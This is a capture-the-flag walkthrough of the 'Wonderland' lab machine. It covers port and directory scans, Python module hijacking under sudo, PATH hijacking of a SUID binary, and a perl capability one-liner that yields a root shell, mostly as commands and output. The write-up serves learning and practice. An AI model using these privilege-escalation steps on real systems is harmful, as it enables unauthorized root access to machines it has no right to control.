# Wonderland

![fdba6eaf85513262b2a9b12875b0f342](https://user-images.githubusercontent.com/56447720/151762571-4b11cc2d-a580-48d3-8e62-896d58f219f4.jpeg)

## Port Scan

```bash
└─$ cat nmap_results                                                                                                                    1 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-30 18:59 IST
Nmap scan report for 10.10.82.194 (10.10.82.194)
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.06 seconds

```

## Directory Scan

```bash
└─$ feroxbuster -u http://10.10.82.194/ -w /usr/share/wordlists/dirb/big.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher                    ver: 2.4.0
───────────────────────────┬──────────────────────
     Target Url            │ http://10.10.82.194/
     Threads               │ 50
     Wordlist              │ /usr/share/wordlists/dirb/big.txt
     Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
     Timeout (secs)        │ 7
     User-Agent            │ feroxbuster/2.4.0
     Config File           │ /etc/feroxbuster/ferox-config.toml
     Recursion Depth       │ 4
     New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        0l        0w        0c http://10.10.82.194/img
301        0l        0w        0c http://10.10.82.194/poem
301        0l        0w        0c http://10.10.82.194/r
301        0l        0w        0c http://10.10.82.194/r/a
301        0l        0w        0c http://10.10.82.194/r/a/b
301        0l        0w        0c http://10.10.82.194/r/a/b/b
[####################] - 4m    122808/122808  0s      found:6       errors:0      
[####################] - 2m     20468/20468   146/s   http://10.10.82.194/
[####################] - 2m     20468/20468   126/s   http://10.10.82.194/img
[####################] - 2m     20468/20468   116/s   http://10.10.82.194/poem
[####################] - 2m     20468/20468   116/s   http://10.10.82.194/r
[####################] - 2m     20468/20468   129/s   http://10.10.82.194/r/a
[####################] - 1m     20468/20468   170/s   http://10.10.82.194/r/a/b

```

* the url was made with word `rabbit`
* Visiting `http://10.10.82.194/r/a/b/b/i/t/` gave `ssh password` in the source code (`view-source:http://10.10.82.194/r/a/b/b/i/t/`)

## User flag

* The hint said `everything's upside down here`, as `root.txt` was in user's directory, the `user.txt` was in root directory

```bash

alice@wonderland:~$ cat /root/user.txt
thm{<--SNIPPED-->}

```

### User raabit

* `sudo -l`

```bash
alice@wonderland:~$ sudo -l
[sudo] password for alice: 
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

* The current directory had a python file that imports random library
* We should create a file `random.py` so python would take it executes it

```python

import os
os.system('/bin/bash')
```

* Save the prgm with name `random.py`
* Run it

```bash
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
rabbit@wonderland:~$ ls
__pycache__  random.py  root.txt  walrus_and_the_carpenter.py
rabbit@wonderland:~$ whoami
rabbit

```

### User hatter

* The binary `teaParty` had suid bit

```bash
rabbit@wonderland:/home/rabbit$ ls
teaParty
rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Mon, 31 Jan 2022 10:11:17 +0000
Ask very nicely, and I will give you some tea while you wait for him
sure
Segmentation fault (core dumped)

```

* strings wasn't installed on the machine so I used python server and took that file on my local machine

```bash
└─$ strings teaParty 
/lib64/ld-linux-x86-64.so.2
2U~4
libc.so.6
setuid
puts
getchar
system
__cxa_finalize
setgid
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
Welcome to the tea party!
The Mad Hatter will be here soon.
/bin/echo -n 'Probably by ' && date --date='next hour' -R
Ask very nicely, and I will give you some tea while you wait for him
Segmentation fault (core dumped)
;*3$"
GCC: (Debian 8.3.0-6) 8.3.0

<--SNIPPED-->
```

* The binary uses date for throwing out the time
* `/bin/echo -n 'Probably by ' && date --date='next hour' -R`
* we can use same methodology as previous peivilege escalation
* create a file name `date` and add it to `$PATH` variable

```bash
rabbit@wonderland:/home/rabbit$ cat date
#!/bin/bash

python3 ../alice/random.py

```

* I've used random.py file which we used earlier, you can replace the python3 line with `/bin/bash`
* Run the file to get hatter user

```bash
rabbit@wonderland:/home/rabbit$ ls
date  teaParty
rabbit@wonderland:/home/rabbit$ chmod +x date 
rabbit@wonderland:/home/rabbit$ export PATH=/home/rabbit:$PATH
rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$ 
```

* password file
* The hatter's directory had password file for the user hatter

```bash
hatter@wonderland:/home/hatter$ cat password.txt 
<--SNIPPED-->
hatter@wonderland:/home/hatter$ id
uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)
```

* We still have group id as rabbit
* use the password to escalate privileges : `ssh hatter@localhost`

```bash
hatter@wonderland:~$ id
uid=1003(hatter) gid=1003(hatter) groups=1003(hatter)

```

## Root User

* Checked for capabilities

```bash
hatter@wonderland:~$ getcap -r / 2>/dev/null
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```

* Perl has an setuid
* GTFO bins have payload for capabilities, suid, sudo, etc : `https://gtfobins.github.io/gtfobins/perl/`
* Use `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'` to get root shell

```bash
hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# id                
uid=0(root) gid=1003(hatter) groups=1003(hatter)
# cat /home/alice/root.txt
thm{<--SNIPPED-->}

```
